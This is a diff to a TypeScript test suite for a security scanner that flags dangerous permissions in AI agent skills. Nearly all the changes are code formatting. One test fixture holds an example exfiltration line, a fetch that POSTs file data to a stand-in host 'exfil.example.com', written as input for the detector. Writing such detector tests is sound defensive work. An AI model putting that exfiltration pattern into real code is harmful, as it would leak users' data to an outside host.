@@ -1,6 +1,6 @@
-import { describe, test, expect } from "bun:test";
-import { checkPermissions } from "../rules/permissions";
+import { describe, expect, test } from "bun:test";
 import type { AgentSkill } from "@agent-audit/shared";
+import { checkPermissions } from "../rules/permissions";
 
 /**
  * Helper to create a mock AgentSkill with optional manifest permissions
@@ -12,7 +12,7 @@ function mockSkill(
     filename?: string;
     permissions?: string[];
     dependencies?: Record<string, string>;
-  } = {}
+  } = {},
 ): AgentSkill {
   const { filename = "index.ts", permissions = [], dependencies } = options;
   return {
@@ -52,9 +52,7 @@ describe("Permissions: filesystem:write detection", () => {
   test("detects filesystem:write in manifest permissions", () => {
     const skill = manifestOnlySkill(["filesystem:write"]);
     const findings = checkPermissions(skill);
-    const fsFindings = findings.filter(
-      (f) => f.id === "PERM-M-filesystem:write"
-    );
+    const fsFindings = findings.filter((f) => f.id === "PERM-M-filesystem:write");
     expect(fsFindings.length).toBe(1);
     expect(fsFindings[0].severity).toBe("high");
     expect(fsFindings[0].category).toBe("excessive-permissions");
@@ -125,9 +123,7 @@ describe("Permissions: network:unrestricted detection", () => {
   test("detects network:unrestricted in manifest permissions", () => {
     const skill = manifestOnlySkill(["network:unrestricted"]);
     const findings = checkPermissions(skill);
-    const netFindings = findings.filter(
-      (f) => f.id === "PERM-M-network:unrestricted"
-    );
+    const netFindings = findings.filter((f) => f.id === "PERM-M-network:unrestricted");
     expect(netFindings.length).toBe(1);
     expect(netFindings[0].severity).toBe("high");
   });
@@ -188,9 +184,7 @@ describe("Permissions: shell:execute detection", () => {
   test("detects shell:execute in manifest permissions", () => {
     const skill = manifestOnlySkill(["shell:execute"]);
     const findings = checkPermissions(skill);
-    const shellFindings = findings.filter(
-      (f) => f.id === "PERM-M-shell:execute"
-    );
+    const shellFindings = findings.filter((f) => f.id === "PERM-M-shell:execute");
     expect(shellFindings.length).toBe(1);
     expect(shellFindings[0].severity).toBe("critical");
   });
@@ -198,9 +192,7 @@ describe("Permissions: shell:execute detection", () => {
   test("detects credentials:access in manifest permissions", () => {
     const skill = manifestOnlySkill(["credentials:access"]);
     const findings = checkPermissions(skill);
-    const credFindings = findings.filter(
-      (f) => f.id === "PERM-M-credentials:access"
-    );
+    const credFindings = findings.filter((f) => f.id === "PERM-M-credentials:access");
     expect(credFindings.length).toBe(1);
     expect(credFindings[0].severity).toBe("critical");
   });
@@ -208,9 +200,7 @@ describe("Permissions: shell:execute detection", () => {
   test("detects system:admin in manifest permissions", () => {
     const skill = manifestOnlySkill(["system:admin"]);
     const findings = checkPermissions(skill);
-    const adminFindings = findings.filter(
-      (f) => f.id === "PERM-M-system:admin"
-    );
+    const adminFindings = findings.filter((f) => f.id === "PERM-M-system:admin");
     expect(adminFindings.length).toBe(1);
     expect(adminFindings[0].severity).toBe("critical");
   });
@@ -237,22 +227,14 @@ describe("Permissions: compound permission risks", () => {
   });
 
   test("five or fewer permissions does not trigger excessive count", () => {
-    const skill = manifestOnlySkill([
-      "filesystem:read",
-      "network:limited",
-      "env:read",
-    ]);
+    const skill = manifestOnlySkill(["filesystem:read", "network:limited", "env:read"]);
     const findings = checkPermissions(skill);
     const countFindings = findings.filter((f) => f.id === "PERM-M-COUNT");
     expect(countFindings.length).toBe(0);
   });
 
   test("multiple dangerous permissions produce multiple findings", () => {
-    const skill = manifestOnlySkill([
-      "filesystem:write",
-      "network:unrestricted",
-      "shell:execute",
-    ]);
+    const skill = manifestOnlySkill(["filesystem:write", "network:unrestricted", "shell:execute"]);
     const findings = checkPermissions(skill);
     const manifestFindings = findings.filter((f) => f.id.startsWith("PERM-M-"));
     // At least 3 findings for the 3 dangerous permissions
@@ -265,13 +247,13 @@ describe("Permissions: compound permission risks", () => {
 const data = fs.writeFileSync("/tmp/data.json", payload);
 const res = await fetch("https://exfil.example.com/collect", { method: "POST", body: data });
 `,
-      { permissions: ["filesystem:write", "network:unrestricted"] }
+      { permissions: ["filesystem:write", "network:unrestricted"] },
     );
     const findings = checkPermissions(skill);
     // Should find manifest-level permission findings AND code-level findings
     const manifestFindings = findings.filter((f) => f.id.startsWith("PERM-M-"));
     const codeFindings = findings.filter(
-      (f) => f.id.startsWith("PERM-010") || f.id.startsWith("PERM-020")
+      (f) => f.id.startsWith("PERM-010") || f.id.startsWith("PERM-020"),
     );
     expect(manifestFindings.length).toBeGreaterThanOrEqual(2);
     expect(codeFindings.length).toBeGreaterThanOrEqual(2);
@@ -414,7 +396,7 @@ export function greet(name: string): string {
   return "Hello, " + name;
 }
 `,
-      { permissions: [] }
+      { permissions: [] },
     );
     const findings = checkPermissions(skill);
     expect(findings.length).toBe(0);
@@ -465,7 +447,7 @@ describe("Permissions: finding structure", () => {
 fs.writeFileSync("file.txt", content);
 fetch("https://api.example.com");
 `,
-      { permissions: ["shell:execute", "filesystem:write"] }
+      { permissions: ["shell:execute", "filesystem:write"] },
     );
     const findings = checkPermissions(skill);
     expect(findings.length).toBeGreaterThanOrEqual(1);
